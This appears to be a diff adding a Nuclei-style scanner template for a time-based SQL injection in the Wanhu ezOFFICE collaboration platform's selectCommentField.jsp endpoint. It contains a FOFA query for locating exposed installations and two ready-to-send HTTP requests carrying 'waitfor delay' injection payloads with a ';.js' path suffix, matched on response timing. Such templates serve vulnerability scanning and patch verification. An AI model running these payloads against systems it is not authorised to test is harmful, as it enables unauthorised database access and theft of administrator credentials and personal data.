@@ -1,0 +1,31 @@
+id: wanhu-ezOFFICE-selectCommentField_jsp-sql-time
+
+info:
+  name: "万户 ezOFFICE 系统 selectCommentField.jsp 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="万户ezOFFICE协同管理平台" || title="ezOFFICE协同管理平台" || title="Wanhu ezOFFICE" || title="ezOffice for iPhone" || body="EZOFFICEUSERNAME" || body="whirRootPath" || body="/defaultroot/js/cookie.js" || header="LocLan" || (banner="/defaultroot/sp/login.jsp" && banner="Set-Cookie: JSESSIONID=") || (header="Set-Cookie: OASESSIONID=" && (title="ezOFFICE" || body="whir.util.js" || body="var ezofficeUserPortal_ = Cookie(\"ezofficeUserPortal\")"))
+      万户ezOFFICE系统selectCommentField.jsp接口存在SQL注入漏洞。攻击者可通过构造恶意SQL查询实现数据库未授权访问，导致敏感数据泄露（如管理员凭证、用户个人信息）。在具备高权限条件下，可能利用数据库扩展功能或服务器配置缺陷实现远程代码执行及持久化控制。
+  reference:
+  - https://mp.weixin.qq.com/s/exYOLhR6rOqhqP0r52-_WQ
+  tags: 万户ezOFFICE
+
+
+
+http:
+- raw:
+  - |
+    GET /defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;waitfor+delay+'0:0:4'--+- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+  - |
+    GET /defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;waitfor+delay+'0:0:8'--+- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
